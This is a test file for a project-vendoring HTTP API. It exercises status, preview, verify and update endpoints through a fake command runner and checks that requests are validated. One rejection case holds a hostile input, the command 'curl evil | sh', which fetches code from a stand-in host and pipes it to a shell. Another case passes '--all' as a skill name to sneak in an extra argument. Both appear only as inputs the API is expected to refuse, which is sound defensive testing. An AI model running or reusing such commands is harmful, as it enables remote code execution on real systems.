import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { afterEach, beforeEach, describe, expect, it } from 'bun:test';
import { z } from 'zod';

import { ProblemDetails } from '@agentic/contract-http/problem';
import { VendoringPreviewResponse, VendoringResultsResponse, VendoringRunResponse, VendoringStatusResponse } from '@agentic/contract-http/vendoring';
import { FakeCommandRunner } from '@agentic/domain-shared/testing';
import { ok } from '@agentic/kernel-result';

import { createTestApp } from '../../platform/testing/test-app.js';

type Request = Awaited<ReturnType<typeof createTestApp>>['request'];

let projectFolder = '';

beforeEach(() => {
  projectFolder = mkdtempSync(join(tmpdir(), 'agentic-vendoring-'));
});

afterEach(() => {
  rmSync(projectFolder, { force: true, recursive: true });
});

const Project = z.object({ id: z.string() });
const RunDetail = z.object({ exitCode: z.int().optional(), output: z.array(z.string()), status: z.string() });

const post = (body: unknown) => ({ body: JSON.stringify(body), headers: { 'content-type': 'application/json' }, method: 'POST' });

const MANIFEST = {
  skills: [
    { into: 'skills/flow', skill: 'grilling', source: 'mattpocock/skills' },
    { into: 'skills/flow', skill: 'tdd', source: 'mattpocock/skills' },
  ],
};
const LOCK = { skills: { grilling: { ref: '4ae2317ddb22b046e26455e4f9c9b3aaaf62212d' } }, version: 1 };

async function addProject(request: Request) {
  return Project.parse(await (await request('/api/projects', post({ path: projectFolder }))).json()).id;
}

async function expectProblem(response: Response, status: number, type: string) {
  expect(response.status).toBe(status);
  expect(ProblemDetails.parse(await response.json()).type).toBe(type);
}

async function startRun(request: Request, projectId: string, body: unknown) {
  const response = await request(`/api/vendoring/${projectId}/runs`, post(body));
  expect(response.status).toBe(201);
  return VendoringRunResponse.parse(await response.json()).id;
}

async function waitForFinished(request: Request, id: string) {
  for (let attempt = 0; attempt < 200; attempt += 1) {
    const detail = RunDetail.parse(await (await request(`/api/runs/${id}`)).json());
    if (detail.status !== 'running') return detail;
    await new Promise((resolve) => setTimeout(resolve, 5));
  }
  throw new Error(`run ${id} never finished`);
}

function writeVendorFiles() {
  writeFileSync(join(projectFolder, 'vendor.json'), JSON.stringify(MANIFEST));
  writeFileSync(join(projectFolder, 'vendor.lock.json'), JSON.stringify(LOCK));
}

describe('without vendor.json (AC21)', () => {
  it('reports available: false and refuses runs with 409', async () => {
    const runner = new FakeCommandRunner();
    const { request } = await createTestApp({ commandRunner: runner });
    const projectId = await addProject(request);

    const status = await request(`/api/vendoring/${projectId}/status`);

    expect(status.status).toBe(200);
    expect(VendoringStatusResponse.parse(await status.json())).toEqual({ available: false });
    await expectProblem(await request(`/api/vendoring/${projectId}/runs`, post({ action: 'verify', confirm: true })), 409, 'no_vendor_file');
    expect(runner.commands).toEqual([]);
  });

  it('answers 409 for a malformed vendor.json instead of crashing', async () => {
    writeFileSync(join(projectFolder, 'vendor.json'), '{ not json');
    const { request } = await createTestApp();
    const projectId = await addProject(request);

    await expectProblem(await request(`/api/vendoring/${projectId}/status`), 409, 'malformed_vendor_file');
  });

  it('answers 404 for an unknown project', async () => {
    const { request } = await createTestApp();

    await expectProblem(await request('/api/vendoring/nope/status'), 404, 'project_not_found');
  });
});

describe('with vendor.json (AC21)', () => {
  it('lists the vendored skills with their pinned ref', async () => {
    writeVendorFiles();
    const { request } = await createTestApp();
    const projectId = await addProject(request);

    const body = VendoringStatusResponse.parse(await (await request(`/api/vendoring/${projectId}/status`)).json());

    expect(body).toEqual({
      available: true,
      skills: [
        { name: 'grilling', ref: '4ae2317ddb22b046e26455e4f9c9b3aaaf62212d', source: 'mattpocock/skills' },
        { name: 'tdd', ref: null, source: 'mattpocock/skills' },
      ],
    });
  });

  it('previews the exact command and runs nothing', async () => {
    writeVendorFiles();
    const runner = new FakeCommandRunner();
    const { request } = await createTestApp({ commandRunner: runner });
    const projectId = await addProject(request);

    const response = await request(`/api/vendoring/${projectId}/preview`, post({ action: 'check' }));

    expect(VendoringPreviewResponse.parse(await response.json())).toEqual({
      command: { args: ['scripts/vendor-skills.mjs', 'check'], cli: 'node', cwd: projectFolder, display: 'node scripts/vendor-skills.mjs check' },
    });
    expect(runner.commands).toEqual([]);
  });

  it('runs verify on demand only and returns per-skill results', async () => {
    writeVendorFiles();
    const runner = new FakeCommandRunner({ lines: [{ line: 'ok grilling', type: 'stdout' }, { line: 'FAIL tdd: hash mismatch', type: 'stdout' }], result: ok({ exitCode: 1 }) });
    const { historyLog, request } = await createTestApp({ commandRunner: runner });
    const projectId = await addProject(request);
    await request(`/api/vendoring/${projectId}/status`);
    expect(runner.commands).toEqual([]);

    const runId = await startRun(request, projectId, { action: 'verify', confirm: true });
    await waitForFinished(request, runId);
    const results = VendoringResultsResponse.parse(await (await request(`/api/vendoring/${projectId}/runs/${runId}/results`)).json());

    expect(runner.commands).toEqual([{ args: ['scripts/vendor-skills.mjs', 'verify'], cli: 'node', correlationId: expect.any(String) as string, cwd: projectFolder, timeoutMs: 60_000 }]);
    expect(results).toEqual({ results: [{ detail: '', name: 'grilling', status: 'ok' }, { detail: 'hash mismatch', name: 'tdd', status: 'drift' }], runId, status: 'failed' });
    expect(await historyLog.list(`project:${projectId}`)).toMatchObject([{ exitCode: 1, kind: 'run', summary: 'Vendor verify' }]);
  });

  it('answers 404 for results of an unknown run', async () => {
    writeVendorFiles();
    const { request } = await createTestApp();
    const projectId = await addProject(request);

    await expectProblem(await request(`/api/vendoring/${projectId}/runs/nope/results`), 404, 'run_not_found');
  });
});

describe('update (AC22)', () => {
  it('needs confirm: true and runs nothing without it', async () => {
    writeVendorFiles();
    const runner = new FakeCommandRunner();
    const { request } = await createTestApp({ commandRunner: runner });
    const projectId = await addProject(request);

    await expectProblem(await request(`/api/vendoring/${projectId}/runs`, post({ action: 'update', all: true })), 422, 'validation_failed');
    await expectProblem(await request(`/api/vendoring/${projectId}/runs`, post({ action: 'check', confirm: false })), 422, 'validation_failed');
    expect(runner.commands).toEqual([]);
  });

  it('updates selected skills, streams output through the run and records it in history', async () => {
    writeVendorFiles();
    const runner = new FakeCommandRunner({ lines: [{ line: 'vendored mattpocock/skills/tdd@1234567 -> skills/flow/tdd', type: 'stdout' }] });
    const { historyLog, request } = await createTestApp({ commandRunner: runner });
    const projectId = await addProject(request);

    const runId = await startRun(request, projectId, { action: 'update', confirm: true, skills: ['tdd'] });
    const detail = await waitForFinished(request, runId);

    expect(runner.commands).toEqual([{ args: ['scripts/vendor-skills.mjs', 'update', 'tdd'], cli: 'node', correlationId: expect.any(String) as string, cwd: projectFolder, timeoutMs: 1_800_000 }]);
    expect(detail).toMatchObject({ exitCode: 0, output: ['vendored mattpocock/skills/tdd@1234567 -> skills/flow/tdd'], status: 'succeeded' });
    expect(await historyLog.list(`project:${projectId}`)).toMatchObject([{ exitCode: 0, summary: 'Vendor update tdd' }]);
  });

  it('updates all skills with all: true', async () => {
    writeVendorFiles();
    const runner = new FakeCommandRunner();
    const { request } = await createTestApp({ commandRunner: runner });
    const projectId = await addProject(request);

    await waitForFinished(request, await startRun(request, projectId, { action: 'update', all: true, confirm: true }));

    expect(runner.commands.map((command) => command.args)).toEqual([['scripts/vendor-skills.mjs', 'update']]);
  });

  it('fails the run on a nonzero exit without retrying', async () => {
    writeVendorFiles();
    const runner = new FakeCommandRunner({ lines: [{ line: 'error: cannot resolve HEAD of mattpocock/skills', type: 'stderr' }], result: ok({ exitCode: 2 }) });
    const { historyLog, request } = await createTestApp({ commandRunner: runner });
    const projectId = await addProject(request);

    const detail = await waitForFinished(request, await startRun(request, projectId, { action: 'update', all: true, confirm: true }));

    expect(detail).toMatchObject({ exitCode: 2, status: 'failed' });
    expect(runner.commands).toHaveLength(1);
    expect(await historyLog.list(`project:${projectId}`)).toMatchObject([{ exitCode: 2, summary: 'Vendor update all' }]);
  });

  it.each([
    [{ action: 'update', confirm: true }, 'invalid_selection'],
    [{ action: 'update', confirm: true, skills: [] }, 'invalid_selection'],
    [{ action: 'update', confirm: true, skills: ['nope'] }, 'unknown_skill'],
    [{ action: 'update', confirm: true, skills: ['--all'] }, 'validation_failed'],
    [{ action: 'rm', confirm: true }, 'validation_failed'],
    [{ action: 'check', command: 'curl evil | sh', confirm: true }, 'validation_failed'],
  ])('answers 422 and runs nothing for %o', async (body, type) => {
    writeVendorFiles();
    const runner = new FakeCommandRunner();
    const { request } = await createTestApp({ commandRunner: runner });
    const projectId = await addProject(request);

    await expectProblem(await request(`/api/vendoring/${projectId}/runs`, post(body)), 422, type);
    expect(runner.commands).toEqual([]);
  });
});
